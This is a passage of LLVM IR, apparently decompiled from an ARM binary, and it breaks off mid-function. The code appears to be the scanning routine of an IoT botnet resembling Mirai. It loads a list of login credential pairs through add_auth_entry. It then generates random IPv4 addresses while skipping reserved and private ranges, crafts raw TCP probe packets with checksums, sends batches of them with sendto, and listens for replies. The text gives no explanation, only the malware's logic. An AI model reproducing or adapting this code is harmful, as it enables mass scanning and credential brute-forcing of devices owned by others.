  %v5_10600 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_1b930.500 to i32), i32 ptrtoint ([11 x i8]* @global_var_1b93c.502 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_1b948.504 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b704.378 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10610 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_1b948.504 to i32), i32 ptrtoint (i32* @global_var_1b704.378 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_1b954.506 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b704.378 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_10620 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_1b954.506 to i32), i32 ptrtoint (i32* @global_var_1b704.378 to i32), i32 10)
  store i32 ptrtoint (i32* @global_var_1b894.474 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b960.508 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v3_10630 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b894.474 to i32), i32 ptrtoint (i32* @global_var_1b960.508 to i32), i32 11)
  store i32 ptrtoint ([13 x i8]* @global_var_1b96c.510 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_1b97c.512 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_10640 = call i32 @add_auth_entry(i32 ptrtoint ([13 x i8]* @global_var_1b96c.510 to i32), i32 ptrtoint ([13 x i8]* @global_var_1b97c.512 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_1b98c.514 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b994.516 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_10650 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1b98c.514 to i32), i32 ptrtoint (i32* @global_var_1b994.516 to i32), i32 13)
  store i32 ptrtoint ([9 x i8]* @global_var_1b99c.518 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b9a8.520 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_10660 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_1b99c.518 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b9a8.520 to i32), i32 15)
  store i32 ptrtoint ([12 x i8]* @global_var_1b9b0.522 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b9bc.524 to i32), i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_10670 = call i32 @add_auth_entry(i32 ptrtoint ([12 x i8]* @global_var_1b9b0.522 to i32), i32 ptrtoint (i32* @global_var_1b9bc.524 to i32), i32 20)
  store i32 ptrtoint ([6 x i8]* @global_var_1b9c8.526 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b9bc.524 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v4_10680 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b9c8.526 to i32), i32 ptrtoint (i32* @global_var_1b9bc.524 to i32), i32 14)
  store i32 %v4_10680, i32* %r0.global-to-local, align 4
  %v2_10688 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_10688, i32* @lr, align 4
  br label %dec_label_pc_10690

dec_label_pc_10690:                               ; preds = %dec_label_pc_10dd0, %dec_label_pc_f9d8
  %stack_var_-1880.0 = phi i32 [ %v2_10688, %dec_label_pc_f9d8 ], [ %stack_var_-1880.1, %dec_label_pc_10dd0 ]
  %stack_var_-1876.0 = phi i16 [ %v5_f9d0.le, %dec_label_pc_f9d8 ], [ %stack_var_-1876.1, %dec_label_pc_10dd0 ]
  store i32 ptrtoint (i32* @global_var_246f0.163 to i32), i32* %r0.global-to-local, align 4
  %v2_10694 = load i32, i32* @global_var_246f0.163, align 4
  store i32 %v2_10694, i32* @r4, align 4
  %v0_10698 = load i32, i32* @fp, align 4
  %v3_10698 = icmp uge i32 %v0_10698, %v2_10694
  store i1 %v3_10698, i1* %cpsr_c.global-to-local, align 1
  %v9_10698 = icmp eq i32 %v0_10698, %v2_10694
  store i1 %v9_10698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10698, label %dec_label_pc_10918, label %dec_label_pc_106a0

dec_label_pc_106a0:                               ; preds = %dec_label_pc_10690
  store i32 0, i32* %r3.global-to-local, align 4
  store i16 0, i16* %stack_var_-52, align 2
  %v2_106a8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_106a8, i32* @r5, align 4
  br label %dec_label_pc_106ac

dec_label_pc_106ac:                               ; preds = %.thread39, %dec_label_pc_106a0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_106c0 = call i32 @rand_next()
  %v1_106c0 = trunc i32 %v0_106c0 to i16
  store i32 %v0_106c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_271b8.90 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32* %r2.global-to-local, align 4
  %v2_106cc = load i32, i32* @global_var_271b8.90, align 4
  store i32 %v2_106cc, i32* %r3.global-to-local, align 4
  store i16 %v1_106c0, i16* bitcast (i32* @global_var_246c4.184 to i16*), align 4
  store i32 %v2_106cc, i32* @global_var_246cc.527, align 4
  br label %dec_label_pc_106d8

dec_label_pc_106d8:                               ; preds = %dec_label_pc_107ac, %dec_label_pc_10708, %dec_label_pc_107e0, %dec_label_pc_107d4, %dec_label_pc_107c8, %dec_label_pc_107bc, %.thread30, %bb367, %bb366, %bb365, %bb364, %bb363, %dec_label_pc_107a4, %dec_label_pc_1079c, %bb359, %dec_label_pc_1076c, %dec_label_pc_10748, %bb352, %dec_label_pc_10718, %bb351, %dec_label_pc_10700, %bb350, %bb369, %dec_label_pc_106ac
  %v0_106d8 = call i32 @rand_next()
  store i32 %v0_106d8, i32* %r0.global-to-local, align 4
  %v1_106dc = urem i32 %v0_106d8, 256
  store i32 %v1_106dc, i32* %r1.global-to-local, align 4
  %v3_106e0 = udiv i32 %v0_106d8, 256
  store i32 %v3_106e0, i32* %r3.global-to-local, align 4
  %v3_106e4 = udiv i32 %v0_106d8, 65536
  store i32 %v3_106e4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106e8 = icmp eq i32 %v1_106dc, 0
  store i1 %v2_106e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_106e8, label %bb350, label %bb349

bb349:                                            ; preds = %dec_label_pc_106d8
  %v3_106ec = icmp ugt i32 %v1_106dc, 126
  store i1 %v3_106ec, i1* %cpsr_c.global-to-local, align 1
  %v8_106ec = icmp eq i32 %v1_106dc, 127
  store i1 %v8_106ec, i1* %cpsr_z.global-to-local, align 1
  br label %bb350

bb350:                                            ; preds = %dec_label_pc_106d8, %bb349
  %v0_106fc = phi i1 [ true, %dec_label_pc_106d8 ], [ %v8_106ec, %bb349 ]
  %v1_106f0 = urem i32 %v3_106e0, 256
  store i32 %v1_106f0, i32* %ip.global-to-local, align 4
  %v1_106f4 = urem i32 %v3_106e4, 256
  store i32 %v1_106f4, i32* %r2.global-to-local, align 4
  %v1_106f8 = and i32 %v0_106d8, 8388608
  %v2_106f8 = icmp ne i32 %v1_106f8, 0
  store i1 %v2_106f8, i1* %cpsr_c.global-to-local, align 1
  %v3_106f8 = udiv i32 %v0_106d8, 16777216
  store i32 %v3_106f8, i32* %r0.global-to-local, align 4
  br i1 %v0_106fc, label %dec_label_pc_106d8, label %dec_label_pc_10700

dec_label_pc_10700:                               ; preds = %bb350
  %v2_10700 = icmp ugt i32 %v1_106dc, 2
  store i1 %v2_10700, i1* %cpsr_c.global-to-local, align 1
  %v7_10700 = icmp eq i32 %v1_106dc, 3
  store i1 %v7_10700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10700, label %dec_label_pc_106d8, label %dec_label_pc_10708

dec_label_pc_10708:                               ; preds = %dec_label_pc_10700
  %v1_10708 = add nsw i32 %v1_106dc, -15
  store i32 %v1_10708, i32* %r3.global-to-local, align 4
  %v2_1070c = icmp ugt i32 %v1_106dc, 55
  store i1 %v2_1070c, i1* %cpsr_c.global-to-local, align 1
  %v7_1070c = icmp eq i32 %v1_106dc, 56
  store i1 %v7_1070c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1070c, label %dec_label_pc_106d8, label %bb351

bb351:                                            ; preds = %dec_label_pc_10708
  %v3_10710 = icmp ne i32 %v1_10708, 0
  store i1 %v3_10710, i1* %cpsr_c.global-to-local, align 1
  %v8_10710 = icmp eq i32 %v1_10708, 1
  store i1 %v8_10710, i1* %cpsr_z.global-to-local, align 1
  %v2_10714 = xor i1 %v3_10710, true
  %v3_10714 = or i1 %v8_10710, %v2_10714
  br i1 %v3_10714, label %dec_label_pc_106d8, label %dec_label_pc_10718

dec_label_pc_10718:                               ; preds = %bb351
  %v2_10718 = icmp ugt i32 %v1_106dc, 9
  store i1 %v2_10718, i1* %cpsr_c.global-to-local, align 1
  %v7_10718 = icmp eq i32 %v1_106dc, 10
  store i1 %v7_10718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10718, label %dec_label_pc_106d8, label %dec_label_pc_10720

dec_label_pc_10720:                               ; preds = %dec_label_pc_10718
  %v2_10720 = icmp ugt i32 %v1_106dc, 191
  store i1 %v2_10720, i1* %cpsr_c.global-to-local, align 1
  %v7_10720 = icmp eq i32 %v1_106dc, 192
  store i1 %v7_10720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10720, label %bb352, label %dec_label_pc_1072c

bb352:                                            ; preds = %dec_label_pc_10720
  %v3_10724 = icmp ugt i32 %v1_106f0, 167
  store i1 %v3_10724, i1* %cpsr_c.global-to-local, align 1
  %v8_10724 = icmp eq i32 %v1_106f0, 168
  store i1 %v8_10724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10724, label %dec_label_pc_106d8, label %dec_label_pc_1072c

dec_label_pc_1072c:                               ; preds = %dec_label_pc_10720, %bb352
  %v7_1072c = icmp eq i32 %v1_106dc, 172
  %.429 = zext i1 %v7_1072c to i32
  store i32 %.429, i32* %r3.global-to-local, align 4
  %v2_10738 = icmp ugt i32 %v1_106f0, 14
  store i1 %v2_10738, i1* %cpsr_c.global-to-local, align 1
  %v7_10738 = icmp eq i32 %v1_106f0, 15
  store i1 %v7_10738, i1* %cpsr_z.global-to-local, align 1
  %v2_1073c = xor i1 %v2_10738, true
  %v3_1073c = or i1 %v7_10738, %v2_1073c
  br i1 %v3_1073c, label %.thread8, label %bb355

.thread8:                                         ; preds = %dec_label_pc_1072c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10750

bb355:                                            ; preds = %dec_label_pc_1072c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10740 = icmp eq i1 %v7_1072c, false
  store i1 %v2_10740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10740, label %dec_label_pc_10750, label %dec_label_pc_10748

dec_label_pc_10748:                               ; preds = %bb355
  %v2_10748 = icmp ugt i32 %v1_106f0, 30
  store i1 %v2_10748, i1* %cpsr_c.global-to-local, align 1
  %v7_10748 = icmp eq i32 %v1_106f0, 31
  store i1 %v7_10748, i1* %cpsr_z.global-to-local, align 1
  %v2_1074c = xor i1 %v2_10748, true
  %v3_1074c = or i1 %v7_10748, %v2_1074c
  br i1 %v3_1074c, label %dec_label_pc_106d8, label %dec_label_pc_10750

dec_label_pc_10750:                               ; preds = %.thread8, %dec_label_pc_10748, %bb355
  %v7_10750 = icmp eq i32 %v1_106dc, 100
  %.430 = zext i1 %v7_10750 to i32
  store i32 %.430, i32* %r3.global-to-local, align 4
  %v2_1075c = icmp ugt i32 %v1_106f0, 62
  store i1 %v2_1075c, i1* %cpsr_c.global-to-local, align 1
  %v7_1075c = icmp eq i32 %v1_106f0, 63
  store i1 %v7_1075c, i1* %cpsr_z.global-to-local, align 1
  %v2_10760 = xor i1 %v2_1075c, true
  %v3_10760 = or i1 %v7_1075c, %v2_10760
  br i1 %v3_10760, label %.thread13, label %bb358

.thread13:                                        ; preds = %dec_label_pc_10750
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10774

bb358:                                            ; preds = %dec_label_pc_10750
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10764 = icmp eq i1 %v7_10750, false
  store i1 %v2_10764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10764, label %dec_label_pc_10774, label %dec_label_pc_1076c

dec_label_pc_1076c:                               ; preds = %bb358
  %v2_1076c = icmp ugt i32 %v1_106f0, 125
  store i1 %v2_1076c, i1* %cpsr_c.global-to-local, align 1
  %v7_1076c = icmp eq i32 %v1_106f0, 126
  store i1 %v7_1076c, i1* %cpsr_z.global-to-local, align 1
  %v2_10770 = xor i1 %v2_1076c, true
  %v3_10770 = or i1 %v7_1076c, %v2_10770
  br i1 %v3_10770, label %dec_label_pc_106d8, label %dec_label_pc_10774

dec_label_pc_10774:                               ; preds = %.thread13, %dec_label_pc_1076c, %bb358
  %v2_10774 = icmp ugt i32 %v1_106dc, 168
  store i1 %v2_10774, i1* %cpsr_c.global-to-local, align 1
  %v7_10774 = icmp eq i32 %v1_106dc, 169
  store i1 %v7_10774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10774, label %bb359, label %dec_label_pc_10780

bb359:                                            ; preds = %dec_label_pc_10774
  %v3_10778 = icmp eq i32 %v1_106f0, 255
  store i1 %v3_10778, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_10778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10778, label %dec_label_pc_106d8, label %dec_label_pc_10780

dec_label_pc_10780:                               ; preds = %dec_label_pc_10774, %bb359
  %v7_10780 = icmp eq i32 %v1_106dc, 198
  %.431 = zext i1 %v7_10780 to i32
  store i32 %.431, i32* %r3.global-to-local, align 4
  %v2_1078c = icmp ugt i32 %v1_106f0, 16
  store i1 %v2_1078c, i1* %cpsr_c.global-to-local, align 1
  %v7_1078c = icmp eq i32 %v1_106f0, 17
  store i1 %v7_1078c, i1* %cpsr_z.global-to-local, align 1
  %v2_10790 = xor i1 %v2_1078c, true
  %v3_10790 = or i1 %v7_1078c, %v2_10790
  br i1 %v3_10790, label %.thread19, label %bb362

.thread19:                                        ; preds = %dec_label_pc_10780
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_107a4

bb362:                                            ; preds = %dec_label_pc_10780
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10794 = icmp eq i1 %v7_10780, false
  store i1 %v2_10794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10794, label %dec_label_pc_107a4, label %dec_label_pc_1079c

dec_label_pc_1079c:                               ; preds = %bb362
  %v2_1079c = icmp ugt i32 %v1_106f0, 18
  store i1 %v2_1079c, i1* %cpsr_c.global-to-local, align 1
  %v7_1079c = icmp eq i32 %v1_106f0, 19
  store i1 %v7_1079c, i1* %cpsr_z.global-to-local, align 1
  %v2_107a0 = xor i1 %v2_1079c, true
  %v3_107a0 = or i1 %v7_1079c, %v2_107a0
  br i1 %v3_107a0, label %dec_label_pc_106d8, label %dec_label_pc_107a4

dec_label_pc_107a4:                               ; preds = %.thread19, %dec_label_pc_1079c, %bb362
  %v2_107a4 = icmp ugt i32 %v1_106dc, 222
  store i1 %v2_107a4, i1* %cpsr_c.global-to-local, align 1
  %v7_107a4 = icmp eq i32 %v1_106dc, 223
  store i1 %v7_107a4, i1* %cpsr_z.global-to-local, align 1
  %v2_107a8 = xor i1 %v7_107a4, true
  %v3_107a8 = and i1 %v2_107a4, %v2_107a8
  br i1 %v3_107a8, label %dec_label_pc_106d8, label %dec_label_pc_107ac

dec_label_pc_107ac:                               ; preds = %dec_label_pc_107a4
  %v1_107ac = add nsw i32 %v1_106dc, -6
  store i32 %v1_107ac, i32* %r3.global-to-local, align 4
  %v2_107b0 = icmp ugt i32 %v1_106dc, 10
  store i1 %v2_107b0, i1* %cpsr_c.global-to-local, align 1
  %v7_107b0 = icmp eq i32 %v1_106dc, 11
  store i1 %v7_107b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107b0, label %dec_label_pc_106d8, label %bb363

bb363:                                            ; preds = %dec_label_pc_107ac
  %v3_107b4 = icmp ne i32 %v1_107ac, 0
  store i1 %v3_107b4, i1* %cpsr_c.global-to-local, align 1
  %v8_107b4 = icmp eq i32 %v1_107ac, 1
  store i1 %v8_107b4, i1* %cpsr_z.global-to-local, align 1
  %v2_107b8 = xor i1 %v3_107b4, true
  %v3_107b8 = or i1 %v8_107b4, %v2_107b8
  br i1 %v3_107b8, label %dec_label_pc_106d8, label %dec_label_pc_107bc

dec_label_pc_107bc:                               ; preds = %bb363
  %v2_107bc = icmp ugt i32 %v1_106dc, 21
  store i1 %v2_107bc, i1* %cpsr_c.global-to-local, align 1
  %v7_107bc = icmp eq i32 %v1_106dc, 22
  store i1 %v7_107bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107bc, label %dec_label_pc_106d8, label %bb364

bb364:                                            ; preds = %dec_label_pc_107bc
  %v3_107c0 = icmp ugt i32 %v1_106dc, 20
  store i1 %v3_107c0, i1* %cpsr_c.global-to-local, align 1
  %v8_107c0 = icmp eq i32 %v1_106dc, 21
  store i1 %v8_107c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107c0, label %dec_label_pc_106d8, label %dec_label_pc_107c8

dec_label_pc_107c8:                               ; preds = %bb364
  %v2_107c8 = icmp ugt i32 %v1_106dc, 27
  store i1 %v2_107c8, i1* %cpsr_c.global-to-local, align 1
  %v7_107c8 = icmp eq i32 %v1_106dc, 28
  store i1 %v7_107c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107c8, label %dec_label_pc_106d8, label %bb365

bb365:                                            ; preds = %dec_label_pc_107c8
  %v3_107cc = icmp ugt i32 %v1_106dc, 25
  store i1 %v3_107cc, i1* %cpsr_c.global-to-local, align 1
  %v8_107cc = icmp eq i32 %v1_106dc, 26
  store i1 %v8_107cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107cc, label %dec_label_pc_106d8, label %dec_label_pc_107d4

dec_label_pc_107d4:                               ; preds = %bb365
  %v2_107d4 = icmp ugt i32 %v1_106dc, 29
  store i1 %v2_107d4, i1* %cpsr_c.global-to-local, align 1
  %v7_107d4 = icmp eq i32 %v1_106dc, 30
  store i1 %v7_107d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107d4, label %dec_label_pc_106d8, label %bb366

bb366:                                            ; preds = %dec_label_pc_107d4
  %v3_107d8 = icmp ugt i32 %v1_106dc, 28
  store i1 %v3_107d8, i1* %cpsr_c.global-to-local, align 1
  %v8_107d8 = icmp eq i32 %v1_106dc, 29
  store i1 %v8_107d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107d8, label %dec_label_pc_106d8, label %dec_label_pc_107e0

dec_label_pc_107e0:                               ; preds = %bb366
  %v2_107e0 = icmp ugt i32 %v1_106dc, 54
  store i1 %v2_107e0, i1* %cpsr_c.global-to-local, align 1
  %v7_107e0 = icmp eq i32 %v1_106dc, 55
  store i1 %v7_107e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107e0, label %dec_label_pc_106d8, label %bb367

bb367:                                            ; preds = %dec_label_pc_107e0
  %v3_107e4 = icmp ugt i32 %v1_106dc, 32
  store i1 %v3_107e4, i1* %cpsr_c.global-to-local, align 1
  %v8_107e4 = icmp eq i32 %v1_106dc, 33
  store i1 %v8_107e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107e4, label %dec_label_pc_106d8, label %dec_label_pc_107ec

dec_label_pc_107ec:                               ; preds = %bb367
  %v2_107ec = icmp ugt i32 %v1_106dc, 214
  store i1 %v2_107ec, i1* %cpsr_c.global-to-local, align 1
  %v7_107ec = icmp eq i32 %v1_106dc, 215
  store i1 %v7_107ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107ec, label %.thread30, label %bb368

bb368:                                            ; preds = %dec_label_pc_107ec
  %v3_107f0 = icmp ugt i32 %v1_106dc, 213
  store i1 %v3_107f0, i1* %cpsr_c.global-to-local, align 1
  %v8_107f0 = icmp eq i32 %v1_106dc, 214
  store i1 %v8_107f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107f0, label %bb369, label %dec_label_pc_10800

.thread30:                                        ; preds = %dec_label_pc_107ec
  br label %dec_label_pc_106d8

bb369:                                            ; preds = %bb368
  br label %dec_label_pc_106d8

dec_label_pc_10800:                               ; preds = %bb368
  %v5_1080c = call i32 @llvm.bswap.i32(i32 %v0_106d8)
  store i32 %v5_1080c, i32* %r3.global-to-local, align 4
  %tmp370 = and i32 %v0_106d8, 65280
  %tmp371 = call i32 @llvm.bswap.i32(i32 %tmp370)
  %v3_10814 = udiv i32 %v5_1080c, 16777216
  %tmp372 = and i32 %v0_106d8, 16711680
  %tmp373 = call i32 @llvm.bswap.i32(i32 %tmp372)
  %v4_1081c = udiv i32 %tmp371, 256
  %v4_10820 = mul nuw nsw i32 %tmp373, 256
  store i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32* @r0, align 4
  %tmp374 = and i32 %v0_106d8, 65536
  %v3_10828 = icmp ne i32 %tmp374, 0
  store i1 %v3_10828, i1* %cpsr_c.global-to-local, align 1
  %v4_10828 = mul i32 %v5_1080c, 16777216
  %v5_1081c = or i32 %v4_10828, %v3_10814
  %v5_10820 = or i32 %v5_1081c, %v4_1081c
  %v5_10828 = or i32 %v5_10820, %v4_10820
  store i32 %v5_10828, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_246ca.528 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_10828, i32* @global_var_246d0.529, align 4
  %v3_10838 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32 20)
  store i32 %v3_10838, i32* %r0.global-to-local, align 4
  %v3_1083c = load i16, i16* %stack_var_-52, align 2
  %v4_1083c = sext i16 %v3_1083c to i32
  store i32 %v4_1083c, i32* %r1.global-to-local, align 4
  %tmp531 = sdiv i16 %v3_1083c, 10
  %v5_1084c = zext i16 %tmp531 to i32
  %v3_10850 = mul nuw nsw i32 %v5_1084c, 8
  store i32 %v3_10850, i32* %r2.global-to-local, align 4
  %v2_10858 = mul nuw nsw i32 %v5_1084c, 10
  store i32 %v2_10858, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32* %ip.global-to-local, align 4
  %v3_10860 = icmp uge i32 %v4_1083c, %v2_10858
  store i1 %v3_10860, i1* %cpsr_c.global-to-local, align 1
  %v9_10860 = icmp eq i32 %v4_1083c, %v2_10858
  store i1 %v9_10860, i1* %cpsr_z.global-to-local, align 1
  %v1_10864 = trunc i32 %v3_10838 to i16
  store i16 %v1_10864, i16* bitcast (i32* @global_var_246ca.528 to i16*), align 4
  br i1 %v9_10860, label %bb375, label %.thread37.thread

.thread37.thread:                                 ; preds = %dec_label_pc_10800
  store i32 5888, i32* %r1.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_246d4.181 to i32), i32 2) to i16*), align 2
  store i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32* %r0.global-to-local, align 4
  br label %.thread39

bb375:                                            ; preds = %dec_label_pc_10800
  store i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32* %r0.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_246d4.181 to i32), i32 2) to i16*), align 2
  br label %.thread39

.thread39:                                        ; preds = %.thread37.thread, %bb375
  %v4_10888 = load i32, i32* @global_var_246d0.529, align 4
  store i32 %v4_10888, i32* @global_var_246d8.531, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_246e4.532 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_246d4.181 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_108a8 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32 ptrtoint (i32* @global_var_246d4.181 to i32), i32 5120, i32 20)
  %v6_108a8 = trunc i32 %v5_108a8 to i16
  store i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32* %r1.global-to-local, align 4
  %v2_108b4 = load i32, i32* @global_var_271d4.176, align 4
  store i16 %v6_108a8, i16* bitcast (i32* @global_var_246e4.532 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_108e0 = load i16, i16* @global_var_246d6.186, align 2
  %v4_108e0 = zext i16 %v3_108e0 to i32
  store i32 %v4_108e0, i32* @lr, align 4
  store i32 %v2_106a8, i32* %ip.global-to-local, align 4
  store i32 %v2_108b4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_108fc = call i32 @__libc_sendto(i32 %v2_108b4, i32 ptrtoint (i8** @global_var_246c0.178 to i32), i32 40, i32 16384, i32 %v2_106a8, i32 16)
  store i32 %v7_108fc, i32* %r0.global-to-local, align 4
  %v3_10900 = load i16, i16* %stack_var_-52, align 2
  %v4_10900 = sext i16 %v3_10900 to i32
  %v1_10904 = add nsw i32 %v4_10900, 1
  store i32 %v1_10904, i32* %r3.global-to-local, align 4
  %v3_10908 = icmp ugt i32 %v1_10904, 383
  store i1 %v3_10908, i1* %cpsr_c.global-to-local, align 1
  %v8_10908 = icmp eq i32 %v1_10904, 384
  store i1 %v8_10908, i1* %cpsr_z.global-to-local, align 1
  %v5_1090c = trunc i32 %v1_10904 to i16
  store i16 %v5_1090c, i16* %stack_var_-52, align 2
  %v5_10910 = icmp slt i32 %v1_10904, 384
  br i1 %v5_10910, label %dec_label_pc_106ac, label %dec_label_pc_10914

dec_label_pc_10914:                               ; preds = %.thread39
  %v0_10914 = load i32, i32* @r4, align 4
  store i32 %v0_10914, i32* @fp, align 4
  br label %dec_label_pc_10918

dec_label_pc_10918:                               ; preds = %dec_label_pc_10690, %dec_label_pc_10914
  %v0_10918 = call i32 @__GI___errno_location()
  store i32 %v0_10918, i32* @sb, align 4
  store i32 %stack_var_-1880.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v1_10928 = add i32 %stack_var_-1880.0, 20
  store i32 %v1_10928, i32* @r4, align 4
  %v1_1097c = add i32 %stack_var_-1880.0, 16
  %v2_1097c = inttoptr i32 %v1_1097c to i32*
  %v1_10990 = add i32 %stack_var_-1880.0, 9
  %v2_10990 = inttoptr i32 %v1_10990 to i8*
  %v4_109bc = sext i16 %stack_var_-1876.0 to i32
  %v1_10a24 = add i32 %stack_var_-1880.0, 12
  %v2_10a24 = inttoptr i32 %v1_10a24 to i32*
  br label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %dec_label_pc_109ec, %dec_label_pc_109e4, %dec_label_pc_109dc, %dec_label_pc_109b8, %dec_label_pc_109a8, %dec_label_pc_1098c, %dec_label_pc_10974, %dec_label_pc_109d4, %dec_label_pc_109c8, %dec_label_pc_1096c, %dec_label_pc_10aa4, %dec_label_pc_10918
  %v1_10930 = phi i32 [ %v0_10918, %dec_label_pc_10918 ], [ %v1_10930.pre.pre, %dec_label_pc_10aa4 ], [ %v0_10960, %dec_label_pc_1096c ], [ %v0_10960, %dec_label_pc_109c8 ], [ %v0_10960, %dec_label_pc_109d4 ], [ %v0_10960, %dec_label_pc_10974 ], [ %v0_10960, %dec_label_pc_1098c ], [ %v0_10960, %dec_label_pc_109a8 ], [ %v0_10960, %dec_label_pc_109b8 ], [ %v0_10960, %dec_label_pc_109dc ], [ %v0_10960, %dec_label_pc_109e4 ], [ %v0_10960, %dec_label_pc_109ec ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_10930 = inttoptr i32 %v1_10930 to i32*
  store i32 0, i32* %v2_10930, align 4
  %v2_1093c = load i32, i32* @global_var_271d4.176, align 4
  store i32 %v2_1093c, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1094c = load i32, i32* %ip.global-to-local, align 4
  %v6_10954 = call i32 @__libc_recvfrom(i32 %v2_1093c, i32 %stack_var_-1880.0, i32 1514, i32 16384, i32 %v0_1094c, i32 %v0_1094c)
  store i32 %v6_10954, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
